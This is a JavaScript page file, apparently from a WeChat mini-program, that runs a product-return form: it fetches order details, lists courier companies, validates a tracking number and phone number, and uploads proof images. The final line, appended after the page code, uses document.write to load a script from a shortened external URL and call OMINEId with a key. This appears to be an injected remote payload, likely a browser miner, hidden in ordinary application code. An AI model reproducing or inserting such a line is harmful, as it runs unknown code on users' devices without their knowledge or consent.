var t = getApp(),
  app =t ,
  e = t.requirejs("core"),
  a = t.requirejs("biz/order"),
  $ = t.requirejs("jquery");
Page({
  data: {
    code: 1,
    tempFilePaths: "",
    show:false,
    https: t.globalData.daxinImg,
    delete: "",
    order: { good: { thumb: t.globalData.daxinImg + "/static/images/banner.png", title: "ME6211C33M5G 盘装", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", pnum: "3000", total: "20.22", address: "赋安大厦A301" }},
    rtypeArr: ["顺丰快递", "百世快递", "中通快递"],
    rtypeArrObj:[],
    rtypeIndex: 0,
    refundstate:0,
    imgs:[],
    images:[],
    sendData:{},
    submits:true,
    isImgok:true
  },
  onLoad: function (e) {
   // e = { id: '1807261672713', re_sn: '20180730135129865' };
    this.setData({
      options: e,
      "sendData.re_sn":e.re_sn
    });  
    if(e.re_sn){
      this.get_list({order_sn:e.id,retreat_sn:e.re_sn});
    }else{
      wx.showModal({
        title: '错误提示',
        content: '退货信息获取失败'
      });
      return;
    };
    this.getDelivery();
  },
  get_list: function (obj) {
    wx.showToast({
      title: '加载中...',
      icon: 'loading',
      duration: 1000
    });
    var _this = this;
    var datas = {
      session_token: t.globalData.session_token, 
      show_data: "retreatDetail"
      };
    datas = $.extend(datas,obj);
    //获取订单信息
    wx.request({
      url: t.globalData.daxin + "/order/orderList",
      data: datas,
      method: "POST",
      success: function (res) {
        wx.hideToast();
        //console.log(res);
        if (res.data.statusCode >= 0 && res.data.data.list) {
         
          var total_price=0;
          var list = res.data.data.list[0], order, retreat_price, imgs; 
          order = $.extend({}, list.order_retreat[0]);
          order.order_goods = _this.getListData(order.re_sn, list.order_retreat_goods).concat();
          $.each(order.order_goods, function (index, val) {
            // console.log(_this.getListData(val.p_id, order.order_goods, "obj"));
            val.retreat_self_num = val.p_num;
            var objs = _this.getListData(val.p_id, list.order_goods, true);
            val = $.extend(true, val, objs);
            val.changeNum = /*val.erp_num*/val.p_num - val.retreat_self_num,
            val.pnum = /*val.erp_num*/val.p_num - val.retreat_self_num,
            val.pprice = val.p_price_true,
            val.ptotal = (val.pnum * val.p_price_true).toFixed(2);
            total_price += parseFloat(val.ptotal);
          });
          retreat_price = order.retreat_money;
          order.has_retreat_money_total = list.has_retreat_money_total
         // imgs = JSON.parse(order.retreat_img);
          _this.setData({
            "order": order,
            show:true,
            imgs: imgs ? imgs : []
          });

        } else {
          wx.showModal({
            title: '提示信息',
            content: '订单信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  getListData: function (value, array, obj) {
    var data = obj ? {} : [];
    if (!$.isArray(array)) { return [] };
    $.each(array, function (ind, val) {
      if (val.re_sn == value) {
        data.push(val);
      }
      if (val.p_id == value && obj) {
        val.thumb = t.globalData.daxinImg + val.img;
        data = val;
        return false;
      }
    });
    return data;
  },
  getDelivery:function(){
    var _this=this;
    wx.request({
      url: t.globalData.daxin + "/Library/kdCompany",
      data: { "pageSize": 1000, session_token: t.globalData.session_token},
      method: "POST",
      success: function (res) {
        wx.hideToast();
        //console.log(res);
        if (res.data.statusCode >= 0 && res.data.data.list) {
          var nameArray=["请选择物流公司"];
          $.each(res.data.data.list,function(ind,val){
            nameArray.push(val.kd_name);
          });
          _this.setData({
            rtypeArrObj: res.data.data.list,
            "rtypeArr": nameArray
          });

        } else {
          wx.showModal({
            title: '提示信息',
            content: '快递公司获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  submit: function (data,fn){
    var datas=this.data.sendData;
    var ispass=this.data.submits;
    var notempty=true;
    var _this = this;
    if (!ispass){return;}
    var data={
      re_sn: "",
      re_delivery_id: "",
      order_sn: _this.data.options.order_sn,
      re_delivery_num: "",
      re_delivery_phone: "",
      retreat_img: []
    };
    var reg = /^1(3|4|5|7|8)+\d{9}$/;
    var names = {
      re_sn: "退货编号",
      re_delivery_id: "物流公司",
      re_delivery_num: "快递单号",
      re_delivery_phone: "联系电话",
      retreat_img: "快递凭证"};
      data = $.extend(data, datas);
    $.each(data,function(ind,val){
        if(!val || val == "" ){
          wx.showModal({
            title: '提示信息',
            content: names[ind]+"不能为空",
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
               
              };
            }
          });
          notempty = false;
          return false;
        } else if (ind == 're_delivery_phone' && !reg.test(val)){
          wx.showModal({
            title: '提示信息',
            content: names[ind] + "有误",
            showCancel: false,
            success: function (res) {
              if (res.confirm) {

              };
            }
          });
          notempty = false;
          return false;
        }
    });
    data.re_delivery_desc="";
    if (!notempty){return;};
    this.setData({
      submits: false
    });
      wx.request({
        url: t.globalData.daxin + "/order/knotOrder",
        data: $.extend({
          session_token: t.globalData.session_token,
          action: "storeWriteDelivery"
        },data),
        method: "POST",
        success: function (res) {
          _this.setData({
            submits: true
          });
          wx.hideLoading();
          if (res.data.statusCode >= 0 ) {
            wx.showToast({
              title: res.data.msg,
              icon: 'success',
              duration: 900,
              success: function () {
                setTimeout(function(){
                  wx.navigateBack();
                },800);
              }
            })
          } else {
            wx.showModal({
              title: '提示信息',
              content: res.data.msg,
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  //console.log('用户点击确定')
                } else if (res.cancel) {
                  //console.log('用户点击取消')
                }
              }
            })
          }
        }
      })
  },
  change: function (t) {
    var a = e.data(t).name,
      i = this.data.sendData||{},
      objAray = this.data.rtypeArrObj;
    if (a == "rtypeIndex"){
      if (t.detail.value<1){
        i["re_delivery_id"] = "";
      }else{
        i["re_delivery_id"] = objAray[t.detail.value -1].id;
      }
      this.setData({
        sendData: i,
        rtypeIndex: t.detail.value
      })
    }else{
      i[a] = t.detail.value;
      this.setData({
        sendData: i
      })
    }
   // console.log(i);
  },
  upload: function (t) {
    //图片上传
    var a = this,
      i = e.data(t),
      s = i.type,
      r = a.data.images,
      n = a.data.imgs,
      o = i.index;
    var isImgoks = true;
    "image" == s ? e.upload(function (t) {
      var showt = app.globalData.uploadimg+t;
        r.push(t),
        n.push(showt);
      if (n.length >= 3) { isImgoks = false;};
        a.setData({
          "sendData.retreat_img": r,
          images: r,
          imgs: n,
          isImgok: isImgoks
        })
    }) : "image-remove" == s ? (r.splice(o, 1), n.splice(o, 1), a.setData({
      "sendData.retreat_img":r,
      images: r,
      imgs: n,
      isImgok: isImgoks
    })) : "image-preview" == s && wx.previewImage({
      current: n[o],
      urls: n
    })
  },
  toggle: function (t) {
    var a = e.pdata(t),
      i = a.id;
    i = 0 == i || void 0 === i ? 1 : 0,
      this.setData({
        code: i
      })
  },
  edit: function (t) {
    this.setData({
      "order.refundstate": 0
    })
  },
  refundcancel: function (t) {
    a.refundcancel(this.data.options.id, function () {
      wx.navigateBack()
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
